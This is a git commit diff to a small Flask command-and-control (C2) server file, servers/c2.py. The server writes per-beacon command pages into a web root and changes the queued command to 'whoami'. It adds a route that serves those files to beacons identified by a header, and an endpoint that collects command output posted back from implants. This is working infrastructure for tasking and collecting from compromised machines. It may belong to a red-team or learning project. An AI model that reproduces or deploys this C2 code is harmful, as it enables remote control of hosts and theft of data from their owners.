967564c30d7719583df9b24cea9f072fee7072d4
matt-culbert <culbertmatt@gmail.com>
2022-05-24 16:38:46 +0000

    Update c2.py

--- servers/c2.py
+++ servers/c2.py
@@ -9,15 +9,27 @@ def home():
     print(f'headers:{val}')
     # create a new page for the UUID we got from the headers
     f = open(f"/var/www/html/{val}.html", "a")
-    f.write("cmd;timeout 2;null ")
+    f.write("cmd;whoami;null ")
     f.close()
     return('found')
+
+@app.route('/<path:filename>', methods=['GET', 'POST'])
+def index(filename):
+    filename = filename or 'index.html'
+    if request.method == 'GET':
+        val = {request.headers['ID']}
+        print(f'Host {val} grabbed command')
+        return send_from_directory('.', filename)
+
+    return jsonify(request.data)
 
 @app.route("/returned",methods = ['POST'])
 def results():
     if request.method == 'POST':
+        val = {request.headers['APPSESSIONID']}
         print(f'Result: {request.data}')
-        print(f'From beacon: {request.headers['APPSESSIONID']}')
-        
+        print(f'From beacon: {val}')
+        return 'HELO'
+
 if __name__=="__main__":
    app.run(debug=True)
